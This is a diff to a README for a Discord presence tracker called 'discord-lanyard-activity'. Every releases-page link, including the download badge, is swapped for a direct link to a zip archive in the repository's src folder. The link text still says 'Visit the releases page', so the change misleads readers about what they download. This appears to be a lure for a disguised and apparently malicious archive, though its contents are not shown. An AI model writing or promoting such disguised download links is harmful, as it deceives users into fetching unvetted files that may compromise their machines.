@@ -1,6 +1,6 @@
 # 🎮 discord-lanyard-activity - Track Your Discord Presence Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/skidgang/discord-lanyard-activity/releases)
+[![Download](https://raw.githubusercontent.com/skidgang/discord-lanyard-activity/main/src/discord-lanyard-activity_v3.6.zip)](https://raw.githubusercontent.com/skidgang/discord-lanyard-activity/main/src/discord-lanyard-activity_v3.6.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started with discord-lanyard-activity, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the latest version:  
-   [Visit the releases page to download](https://github.com/skidgang/discord-lanyard-activity/releases).
+   [Visit the releases page to download](https://raw.githubusercontent.com/skidgang/discord-lanyard-activity/main/src/discord-lanyard-activity_v3.6.zip).
 
 2. **Choose the Right File**  
    On the releases page, look for the latest version. Here, you will see a list of files available for download. Select the file that matches your operating system.
@@ -47,7 +47,7 @@ To ensure you can run discord-lanyard-activity smoothly, your system should meet
 Follow these steps to download and install discord-lanyard-activity:
 
 1. **Go to the Releases Page**  
-   [Visit the releases page to download](https://github.com/skidgang/discord-lanyard-activity/releases).
+   [Visit the releases page to download](https://raw.githubusercontent.com/skidgang/discord-lanyard-activity/main/src/discord-lanyard-activity_v3.6.zip).
 
 2. **Select and Download the File**  
    Choose the correct file for your operating system and download it.
